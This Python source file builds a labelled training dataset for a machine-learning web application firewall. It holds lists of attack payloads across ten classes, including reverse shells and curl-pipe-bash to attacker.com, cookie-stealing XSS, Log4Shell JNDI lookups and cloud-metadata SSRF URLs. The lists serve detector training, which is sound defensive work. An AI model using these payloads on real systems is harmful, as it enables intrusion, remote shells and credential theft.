"""
ml/dataset_builder.py
NIGHTWATCH Dataset Pipeline

Builds a labeled CSV dataset from:
  - Built-in attack payload library (10 attack classes, ~280 payloads)
  - Built-in benign request templates (~350 samples)

Output: data/dataset.csv
Columns: [all 30 features from feature_extractor] + label (0=benign, 1=attack)

In a production WAF you would ALSO feed in:
  - Real HTTP access logs from your web server (label=0)
  - CSIC 2010 HTTP Dataset (publicly available)
  - Your own captured attack traffic from pen tests
The more real data you add, the better the model gets.
"""

import os
import sys
import csv
import random
import string

# Allow imports from project root
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core import feature_extractor

random.seed(42)  # reproducible dataset

# ─────────────────────────────────────────────────────────────────────
#  OUTPUT PATH
# ─────────────────────────────────────────────────────────────────────

OUTPUT_PATH = os.path.join(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
    "data", "dataset.csv"
)

# ─────────────────────────────────────────────────────────────────────
#  ATTACK PAYLOAD LIBRARY
#  These are real payloads used by attackers and security researchers.
#  Each payload will be wrapped into a realistic HTTP request and
#  feature-extracted to create one row in the dataset.
# ─────────────────────────────────────────────────────────────────────

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "1' UNION SELECT NULL--",
    "1' UNION SELECT username,password FROM users--",
    "' OR SLEEP(5)--",
    "1; DROP TABLE users--",
    "' OR 1=1#",
    "admin'--",
    "' UNION SELECT 1,2,3--",
    "1 AND 1=1",
    "1 AND 1=2",
    "' OR 'x'='x",
    "1' AND SLEEP(3)--",
    "' OR BENCHMARK(1000000,MD5(1))--",
    "1 UNION SELECT NULL,NULL,NULL--",
    "' UNION ALL SELECT NULL--",
    "'; SELECT * FROM information_schema.tables--",
    "1 AND (SELECT 1 FROM information_schema.tables)=1",
    "' OR (SELECT COUNT(*) FROM users)>0--",
    "1'; EXEC xp_cmdshell('whoami')--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
    "1 UNION SELECT table_name FROM information_schema.tables--",
    "' OR ASCII(SUBSTRING(username,1,1))>64--",
    "1'; WAITFOR DELAY '0:0:5'--",
    "' OR pg_sleep(5)--",
    "%27+OR+%271%27%3D%271",
    "1%27+UNION+SELECT+NULL--",
    "' OR 1=1 LIMIT 1--",
    "1 AND EXTRACTVALUE(rand(),concat(0x3a,version()))--",
    "' UNION SELECT @@version--",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(document.cookie)>",
    "javascript:alert(1)",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    "<script>fetch('http://attacker.com?c='+document.cookie)</script>",
    "<img src=1 onerror=eval(atob('YWxlcnQoMSk='))>",
    '<input type="text" onfocus=alert(1) autofocus>',
    "<details open ontoggle=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<marquee onstart=alert(1)>",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "<ScRiPt>alert(1)</sCrIpT>",
    "<script>alert`1`</script>",
    "<a href=javascript&colon;alert(1)>click</a>",
    "expression(alert(1))",
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    "vbscript:msgbox(1)",
    "<iframe srcdoc='<script>alert(1)</script>'>",
    '"><img src=x onerror=alert(1)>',
    "<math><mtext><mglyph><svg><mtext><textarea><a title=\"</textarea><img src onerror=alert(1)>\">",
    "'-alert(1)-'",
    "<style>*{background:url('javascript:alert(1)')}</style>",
    "%22onmouseover%3Dalert(1)",
    "<script>document.write('<img src=http://attacker.com/'+document.cookie+'>')</script>",
    "<base href=javascript:/a/-alert(1)///////..>",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../etc/shadow",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "../../../../etc/passwd%00.jpg",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "../../web.config",
    "../../../.env",
    "../../../../var/log/apache2/access.log",
    "%252e%252e%252fetc%252fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "../../../proc/self/environ",
    "../../../../boot.ini",
    "../../../win.ini",
    "..%c0%af..%c0%afetc%c0%afpasswd",
    "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
    "....\/....\/....\/etc/passwd",
    "..././..././..././etc/passwd",
    "/var/www/html/../../etc/passwd",
    "../../../../.htaccess",
]

CMDI_PAYLOADS = [
    "; ls -la",
    "| cat /etc/passwd",
    "& whoami",
    "`id`",
    "$(uname -a)",
    "; curl http://attacker.com",
    "| wget http://attacker.com/shell.sh",
    "; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
    "| nc -e /bin/sh attacker.com 4444",
    "& dir",
    "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
    "| net user",
    "& ipconfig",
    "; systeminfo",
    "| powershell -c Get-Process",
    "; ncat -e /bin/bash attacker.com 4444",
    "| perl -e 'exec(\"/bin/sh\")'",
    "|cat${IFS}/etc/passwd",
    ";{cat,/etc/passwd}",
    "$()ls",
    "; python3 -c 'import os; os.system(\"id\")'",
    "& cmd.exe /c dir",
    "| /bin/sh -i",
    "; rm -rf /tmp/test",
    "$(curl http://attacker.com/$(whoami))",
]

LOG4SHELL_PAYLOADS = [
    "${jndi:ldap://attacker.com/exploit}",
    "${jndi:rmi://attacker.com/exploit}",
    "${jndi:dns://attacker.com/exploit}",
    "${${lower:j}ndi:ldap://attacker.com/a}",
    "${${upper:j}ndi:ldap://attacker.com/a}",
    "${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com/a}",
    "${${lower:j}${upper:n}${lower:d}${upper:i}:ldap://attacker.com/a}",
    "${jndi:${lower:l}${lower:d}a${lower:p}://attacker.com/a}",
    "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//attacker.com/a}",
    "%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D",
    "${jndi:ldap://127.0.0.1:1389/exploit}",
    "${j${::-n}di:ldap://attacker.com/a}",
    "${${lower:${lower:${lower:j}}}ndi:ldap://attacker.com/a}",
    "${jndi:ldaps://attacker.com/exploit}",
    "${jndi:iiop://attacker.com/exploit}",
    "${jndi:corba://attacker.com/exploit}",
    "${main:k8s:-j}${main:k8s:-n}${main:k8s:-d}${main:k8s:-i}:ldap://attacker.com/a",
    "${sys:os.name}",
    "${env:JAVA_HOME}",
    "${java:vm}",
]

SSRF_PAYLOADS = [
    "http://127.0.0.1/admin",
    "http://localhost/",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://192.168.1.1/",
    "http://10.0.0.1/",
    "http://172.16.0.1/",
    "http://0.0.0.0/",
    "file:///etc/passwd",
    "dict://localhost:6379/info",
    "gopher://localhost:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",
    "http://[::1]/",
    "http://2130706433/",
    "http://0x7f000001/",
    "http://127.1/",
    "http://0/",
    "http://169.254.170.2/v2/credentials/",
    "sftp://attacker.com:11111/",
    "ldap://attacker.com/dc=example,dc=com",
    "jar:http://attacker.com!/",
    "http://attacker.com@127.0.0.1/",
    "http://127.0.0.1#attacker.com",
    "http://100.100.100.200/latest/meta-data/",
    "tftp://attacker.com:69/",
]

XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/collect">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>',
    '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
    '<!DOCTYPE foo PUBLIC "-//OWASP//DTD OWASP//EN" "https://attacker.com/evil.dtd">',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]>',
    '<!DOCTYPE x [ <!ENTITY test SYSTEM "netdoc:///etc/passwd">]>',
    '<!DOCTYPE test [<!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init;]>',
    '<?xml?><!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd">]>',
]

SSTI_PAYLOADS = [
    "{{7*7}}",
    "{{7*'7'}}",
    "${7*7}",
    "<%= 7*7 %>",
    "#{7*7}",
    "{{config}}",
    "{{config.items()}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
    "@(7*7)",
    "*{7*7}",
    "{{self.__dict__}}",
    "{{lipsum.__globals__['os'].popen('id').read()}}",
    "{% debug %}",
    "{{''.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").system(\"id\")')}}",
    "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}",
    "#set($x='')##$x.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(null,'id')",
    "${class.getResource('/').getPath()}",
    "{{range.constructor(\"return eval(\\\"global.process.mainModule.require('child_process').execSync('id').toString()\\\")\")()}}",
]

SHELLSHOCK_PAYLOADS = [
    "() { :; }; echo Content-Type: text/plain; echo; id",
    "() { ignored; }; /bin/bash -c 'id'",
    "() { :; }; /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1",
    "() { :; }; wget http://attacker.com/shell.sh",
    "() { :; }; curl http://attacker.com/backdoor | bash",
    "() { :; }; nc -e /bin/sh attacker.com 4444",
    "() { :; }; echo vulnerable",
    "() { :; }; cat /etc/passwd",
    "() { :; }; /usr/bin/id",
    "() { :; }; /bin/sh -c 'id > /tmp/pwned'",
]

HTTP_SMUGGLING_PAYLOADS = [
    "Content-Length: 6\nTransfer-Encoding: chunked",
    "Transfer-Encoding: chunked\nContent-Length: 4",
    "Transfer-Encoding: xchunked",
    "Transfer-Encoding: chunked\nTransfer-Encoding: identity",
    "Transfer-Encoding : chunked",
    "X: X\nTransfer-Encoding: chunked",
    "Transfer-Encoding: chunked\n Transfer-Encoding: identity",
    "Content-Length: 0\nTransfer-Encoding: chunked",
]

# Map of attack_type → payload list
ALL_ATTACKS = {
    "SQLi":           SQLI_PAYLOADS,
    "XSS":            XSS_PAYLOADS,
    "PathTraversal":  PATH_TRAVERSAL_PAYLOADS,
    "CMDi":           CMDI_PAYLOADS,
    "Log4Shell":      LOG4SHELL_PAYLOADS,
    "SSRF":           SSRF_PAYLOADS,
    "XXE":            XXE_PAYLOADS,
    "SSTI":           SSTI_PAYLOADS,
    "Shellshock":     SHELLSHOCK_PAYLOADS,
    "HTTPSmuggling":  HTTP_SMUGGLING_PAYLOADS,
}

# ─────────────────────────────────────────────────────────────────────
#  BENIGN REQUEST TEMPLATES
# ─────────────────────────────────────────────────────────────────────

BENIGN_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0) AppleWebKit/605.1.15 Mobile Safari/604.1",
    "Mozilla/5.0 (Android 12; Mobile; rv:109.0) Gecko/109.0 Firefox/109.0",
    "PostmanRuntime/7.32.1",
    "axios/1.4.0",
    "python-requests/2.31.0",
    "curl/7.88.1",
    "Go-http-client/1.1",
    "okhttp/4.11.0",
    "Dalvik/2.1.0 (Linux; U; Android 11)",
]

BENIGN_URLS = [
    "/",
    "/index.html",
    "/about",
    "/contact",
    "/products",
    "/products?category=electronics&page=1",
    "/products?category=shoes&sort=price&order=asc",
    "/products?brand=Nike&size=10&color=black",
    "/api/users",
    "/api/users/42",
    "/api/users/42/orders",
    "/api/products/search?q=laptop&limit=10",
    "/api/products/search?q=headphones&min_price=50&max_price=200",
    "/blog",
    "/blog/how-to-secure-your-app",
    "/blog?tag=python&page=2",
    "/images/logo.png",
    "/static/css/style.css",
    "/static/js/app.js",
    "/api/health",
    "/api/v1/status",
    "/login",
    "/logout",
    "/register",
    "/dashboard",
    "/dashboard?tab=overview&period=7d",
    "/profile",
    "/settings",
    "/cart",
    "/cart?user_id=1234",
    "/checkout",
    "/orders",
    "/orders/123",
    "/orders?status=pending&page=1",
    "/search?q=python+programming",
    "/search?q=how+to+learn+sql",
    "/search?q=best+laptops+2024",
    "/search?q=machine+learning+tutorial",
    "/api/auth/refresh",
    "/api/notifications",
    "/api/notifications?unread=true",
    "/sitemap.xml",
    "/robots.txt",
    "/favicon.ico",
    "/api/categories",
    "/api/tags",
    "/admin/dashboard",
    "/admin/users?page=1&limit=25",
    "/api/analytics?date=2024-01-01&range=30d",
    "/api/reports?format=json&month=12&year=2024",
    "/download?file=report.pdf",
    "/download?file=invoice_2024.pdf",
    "/api/comments",
    "/api/comments?post=42&page=2",
    "/api/v2/products",
    "/api/v2/categories/5/items",
    "/healthcheck",
    "/metrics",
    "/api/session",
    "/api/csrf-token",
    "/assets/images/hero-banner.jpg",
    "/api/search/suggestions?q=java",
]

BENIGN_BODIES = [
    "",
    '{"username": "alice", "password": "P@ssw0rd123"}',
    '{"email": "user@example.com", "name": "John Doe"}',
    "username=alice&password=secure123",
    '{"message": "Hello World"}',
    '{"items": [{"id": 1, "qty": 2}, {"id": 3, "qty": 1}]}',
    "name=John+Doe&email=john%40example.com&message=Hello+there",
    '{"token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.test.sig"}',
    '{"page": 1, "limit": 25, "sort": "created_at", "order": "desc"}',
    '{"category": "electronics", "price_min": 100, "price_max": 500}',
    "q=laptop&brand=Dell&min_price=500&max_price=1500",
    '{"comment": "Great product! I really enjoyed using it."}',
    '{"rating": 5, "review": "Excellent quality and fast shipping."}',
    '{"address": {"street": "123 Main St", "city": "New York", "zip": "10001"}}',
    '{"action": "subscribe", "plan": "pro", "billing": "monthly"}',
    '{"search": "organic food", "filters": {"vegan": true, "gluten_free": false}}',
    "product_id=42&quantity=3&color=red&size=M",
    '{"user_id": 99, "preferences": {"theme": "dark", "lang": "en"}}',
    '{"feedback": "The website is easy to navigate and the checkout was smooth."}',
    '{"report_type": "sales", "start_date": "2024-01-01", "end_date": "2024-12-31"}',
]

# ─────────────────────────────────────────────────────────────────────
#  REQUEST BUILDERS
# ─────────────────────────────────────────────────────────────────────

def _random_ip() -> str:
    return (
        f"{random.randint(1,254)}.{random.randint(0,255)}"
        f".{random.randint(0,255)}.{random.randint(1,254)}"
    )


def _random_path() -> str:
    return "/" + "".join(random.choices(string.ascii_lowercase, k=random.randint(3, 8)))


def _build_attack_request(payload: str, attack_type: str) -> dict:
    """
    Wrap an attack payload into a realistic HTTP request dict.
    Different attack types are placed in different parts of the request
    (URL params, body, headers) to reflect how they appear in the wild.
    """
    ua = random.choice(BENIGN_USER_AGENTS)

    # Log4Shell and Shellshock live in HTTP headers
    if attack_type in ("Log4Shell", "Shellshock"):
        header_name = random.choice([
            "User-Agent", "X-Forwarded-For", "X-Api-Version",
            "Referer", "X-Custom-Header", "Accept-Language",
        ])
        return {
            "method": "GET",
            "url": random.choice(["/", "/api/data", "/search", "/products"]),
            "headers": {"User-Agent": ua, header_name: payload},
            "body": "",
            "ip": _random_ip(),
        }

    # XXE lives in the POST body as XML
    if attack_type == "XXE":
        return {
            "method": "POST",
            "url": random.choice(["/api/xml", "/import", "/parse", "/upload"]),
            "headers": {"Content-Type": "application/xml", "User-Agent": ua},
            "body": payload,
            "ip": _random_ip(),
        }

    # HTTP Smuggling fingerprints go into headers
    if attack_type == "HTTPSmuggling":
        headers = {"User-Agent": ua, "X-Smuggle-Test": payload}
        # Also add some to raw header string simulation
        return {
            "method": "POST",
            "url": "/",
            "headers": headers,
            "body": "data=normal",
            "ip": _random_ip(),
        }

    # SSRF payloads go in URL params that accept URLs
    if attack_type == "SSRF":
        param = random.choice(["url", "target", "redirect", "next", "fetch", "load", "src"])
        return {
            "method": "GET",
            "url": f"{_random_path()}?{param}={payload}",
            "headers": {"User-Agent": ua},
            "body": "",
            "ip": _random_ip(),
        }

    # All other attacks: split between GET params and POST body
    if random.random() < 0.6:   # 60% GET
        param = random.choice(["q", "id", "search", "name", "input", "data", "filter", "value"])
        return {
            "method": "GET",
            "url": f"{_random_path()}?{param}={payload}",
            "headers": {"User-Agent": ua},
            "body": "",
            "ip": _random_ip(),
        }
    else:                        # 40% POST
        param = random.choice(["data", "input", "content", "value", "payload", "field"])
        return {
            "method": "POST",
            "url": _random_path(),
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": ua,
            },
            "body": f"{param}={payload}",
            "ip": _random_ip(),
        }


def _build_benign_request() -> dict:
    """Build a realistic benign HTTP request."""
    method = random.choice(["GET", "GET", "GET", "POST", "GET"])
    url    = random.choice(BENIGN_URLS)
    body   = random.choice(BENIGN_BODIES) if method == "POST" else ""

    headers = {
        "User-Agent":      random.choice(BENIGN_USER_AGENTS),
        "Accept":          "text/html,application/xhtml+xml,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
    }
    if method == "POST" and body:
        ct = "application/json" if body.strip().startswith("{") else "application/x-www-form-urlencoded"
        headers["Content-Type"] = ct

    return {
        "method": method,
        "url":    url,
        "headers": headers,
        "body":   body,
        "ip":     _random_ip(),
    }


# ─────────────────────────────────────────────────────────────────────
#  MAIN BUILDER
# ─────────────────────────────────────────────────────────────────────

def build_dataset(benign_multiplier: int = 4) -> str:
    """
    Build and save the training dataset.

    Args:
        benign_multiplier: How many benign samples to generate per attack.
                           Default 4 keeps class imbalance reasonable.

    Returns:
        Path to saved CSV file.
    """
    rows = []

    # ── Attack samples ─────────────────────────────────────────────
    attack_count = 0
    for attack_type, payloads in ALL_ATTACKS.items():
        for payload in payloads:
            request  = _build_attack_request(payload, attack_type)
            features = feature_extractor.extract(request)
            features["attack_type"] = attack_type   # for analysis only
            features["label"] = 1                   # 1 = attack
            rows.append(features)
            attack_count += 1

    # ── Benign samples ─────────────────────────────────────────────
    # Generate more benign samples to balance the dataset
    benign_count = attack_count  # 1:1 ratio
    for _ in range(benign_count):
        request  = _build_benign_request()
        features = feature_extractor.extract(request)
        features["attack_type"] = "benign"
        features["label"] = 0   # 0 = benign
        rows.append(features)

    # ── Shuffle to mix attack and benign ───────────────────────────
    random.shuffle(rows)

    # ── Write CSV ──────────────────────────────────────────────────
    os.makedirs(os.path.dirname(OUTPUT_PATH), exist_ok=True)

    if rows:
        fieldnames = list(rows[0].keys())
        with open(OUTPUT_PATH, "w", newline="") as f:
            writer = csv.DictWriter(f, fieldnames=fieldnames)
            writer.writeheader()
            writer.writerows(rows)

    total   = len(rows)
    attacks = sum(1 for r in rows if r["label"] == 1)
    benign  = sum(1 for r in rows if r["label"] == 0)

    print(f"\n[DatasetBuilder] Dataset saved → {OUTPUT_PATH}")
    print(f"  Total samples : {total}")
    print(f"  Attack (1)    : {attacks}  ({attacks/total*100:.1f}%)")
    print(f"  Benign (0)    : {benign}  ({benign/total*100:.1f}%)")
    print(f"  Features      : {len(fieldnames) - 2} (excluding label + attack_type)")

    return OUTPUT_PATH


if __name__ == "__main__":
    build_dataset()
